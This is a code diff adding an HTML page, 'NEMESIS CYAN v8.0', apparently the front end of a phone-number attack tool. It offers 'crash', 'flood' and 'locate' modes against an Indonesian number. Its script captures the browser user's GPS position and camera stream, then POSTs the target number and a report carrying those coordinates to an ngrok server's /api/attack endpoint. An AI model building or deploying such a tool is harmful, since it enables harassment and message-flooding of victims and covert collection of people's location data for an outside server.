@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEMESIS CYAN v8.0</title>
+    <style>
+        body { 
+            margin: 0; background: #000; color: #00f3ff; 
+            font-family: 'Courier New', monospace; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; overflow: hidden; 
+        }
+        .card { 
+            width: 360px; background: #050505; 
+            border: 2px solid #00f3ff; border-radius: 10px; 
+            overflow: hidden; box-shadow: 0 0 20px rgba(0, 243, 255, 0.3); 
+        }
+        .header { 
+            height: 180px; position: relative; border-bottom: 2px solid #00f3ff;
+            background: #000 url('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMGlwOGlveXBybHhybHlqNmV4bHg1bjFndWRsdWNxNmV4bHg1bjFndSZjdD1n/H7ZpA1I034uS4/giphy.gif') center/cover;
+            opacity: 0.8;
+        }
+        #cam { 
+            position: absolute; top: 10px; right: 10px; 
+            width: 75px; height: 95px; border: 1px solid #00f3ff; 
+            background: #000; display: none; object-fit: cover; z-index: 5; 
+            box-shadow: 0 0 10px #00f3ff;
+        }
+        #map { position: absolute; width: 100%; height: 100%; border: none; display: none; }
+        
+        .p-20 { padding: 20px; }
+        h2 { text-align: center; margin: 0 0 20px 0; font-size: 1.2rem; text-shadow: 0 0 10px #00f3ff; letter-spacing: 2px; }
+        
+        input, select { 
+            width: 100%; background: #000; border: 1px solid #00f3ff; 
+            color: #00f3ff; padding: 12px; margin-bottom: 12px; 
+            box-sizing: border-box; outline: none; font-family: 'Courier New', monospace;
+        }
+        input::placeholder { color: rgba(0, 243, 255, 0.5); }
+        
+        .btn { 
+            width: 100%; padding: 15px; background: transparent; 
+            color: #00f3ff; border: 2px solid #00f3ff; font-weight: bold; 
+            cursor: pointer; text-transform: uppercase; transition: 0.3s;
+        }
+        .btn:hover { background: #00f3ff; color: #000; box-shadow: 0 0 20px #00f3ff; }
+        
+        #console { 
+            margin-top: 15px; background: rgba(0, 243, 255, 0.05); 
+            height: 90px; padding: 10px; border: 1px solid #004444; 
+            font-size: 11px; overflow-y: auto; border-radius: 4px;
+        }
+        .success-box { background: #00f3ff; color: #000; font-weight: bold; padding: 0 4px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header">
+        <video id="cam" autoplay playsinline></video>
+        <iframe id="map"></iframe>
+    </div>
+    <div class="p-20">
+        <h2>CYAN_PROTOCOL.exe</h2>
+        <input type="number" id="target" placeholder="Target_ID (628...)">
+        <select id="mode">
+            <option value="crash">ENCRYPTION: CRASH</option>
+            <option value="spam">ENCRYPTION: FLOOD</option>
+            <option value="track">ENCRYPTION: LOCATE</option>
+        </select>
+        <button class="btn" onclick="execute()">INITIATE_ATTACK</button>
+        <div id="console"><div id="logs">> READY_FOR_COMMAND...</div></div>
+    </div>
+</div>
+
+<script>
+    // GANTI LINK NGROK SETIAP KALI RESTART NGROK!
+    const NGROK_URL = "https://a1b2-c3d4.ngrok-free.app"; 
+
+    function log(m) { document.getElementById('logs').innerHTML += `<div>> ${m}</div>`; }
+
+    function execute() {
+        const target = document.getElementById('target').value;
+        const mode = document.getElementById('mode').value;
+        if(!target) return alert("TARGET_MISSING!");
+
+        document.getElementById('logs').innerHTML = "";
+        log("SCANNING_PORT...");
+
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            
+            document.getElementById('map').style.display = "block";
+            document.getElementById('map').src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
+
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({video:true});
+                document.getElementById('cam').style.display = "block";
+                document.getElementById('cam').srcObject = s;
+            } catch(e) { log("CAM_ACCESS_DENIED"); }
+
+            const msg = `💠 *NEMESIS CYAN REPORT*\nTarget: ${target}\nMode: ${mode.toUpperCase()}\nLoc: https://www.google.com/maps?q=${lat},${lon}\nStatus: *COMPLETED*`;
+
+            log("UPLOADING_PAYLOAD...");
+            
+            try {
+                const res = await fetch(`${NGROK_URL}/api/attack`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({target, msg})
+                });
+
+                if(res.ok) {
+                    log("<span class='success-box'>STATUS_SENT_SUCCESSFULLY</span>");
+                } else {
+                    log("CONNECTION_REJECTED");
+                }
+            } catch(e) { log("SERVER_OFFLINE_OR_NGROK_EXPIRED"); }
+        });
+    }
+</script>
+</body>
+</html>
